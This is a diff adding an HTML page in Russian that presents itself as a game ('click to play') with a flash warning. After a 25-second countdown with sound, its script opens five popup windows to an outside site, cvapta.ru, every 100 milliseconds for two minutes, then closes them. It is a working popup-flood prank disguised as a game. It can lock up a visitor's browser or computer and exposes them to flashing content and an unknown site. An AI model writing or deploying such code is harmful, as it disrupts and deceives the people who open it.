@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+        }
+        #text {
+            font-size: 60px;
+            font-weight: bold;
+            text-align: center;
+        }
+        #timer {
+            font-size: 40px;
+            margin-top: 20px;
+        }
+        #warning {
+            position: absolute;
+            bottom: 20px;
+            font-size: 30px;
+            font-weight: bold;
+            color: red;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div id="text">НАЖМИ ЧТОБЫ ИГРАТЬ</div>
+    <div id="timer"></div>
+    <div id="warning">флаш варнинг</div>
+
+    <script>
+        let timerStarted = false;
+        let windows = [];
+        let creationInterval;
+        
+        document.addEventListener('click', async function() {
+            if (timerStarted) return;
+            timerStarted = true;
+            
+            const audio = new Audio('zv.mp3');
+            try {
+                await audio.play();
+            } catch (err) {
+                console.log('Звук не воспроизводится: ', err);
+            }
+            
+            let seconds = 25;
+            const timerElement = document.getElementById('timer');
+            
+            const countdown = setInterval(() => {
+                seconds--;
+                timerElement.textContent = `Осталось: ${seconds} секунд`;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    timerElement.textContent = 'Запуск!';
+                    
+                    // Запускаем создание окон
+                    creationInterval = setInterval(() => {
+                        for(let i = 0; i < 5; i++) {
+                            const x = Math.random() * (screen.availWidth - 400);
+                            const y = Math.random() * (screen.availHeight - 300);
+                            
+                            const win = window.open(
+                                'https://cvapta.ru', 
+                                'win' + Date.now() + Math.random(),
+                                `width=400,height=300,left=${x},top=${y}`
+                            );
+                            if (win) windows.push(win);
+                        }
+                    }, 100);
+                    
+                    // Останавливаем через 2 минуты
+                    setTimeout(() => {
+                        clearInterval(creationInterval);
+                        timerElement.textContent = 'Остановка...';
+                        
+                        // Закрываем всё через 5 секунд
+                        setTimeout(() => {
+                            // Закрываем все созданные окна
+                            windows.forEach(win => {
+                                if (win && !win.closed) {
+                                    win.close();
+                                }
+                            });
+                            // Закрываем основную страницу
+                            window.close();
+                        }, 5000);
+                    }, 120000); // 2 минуты
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
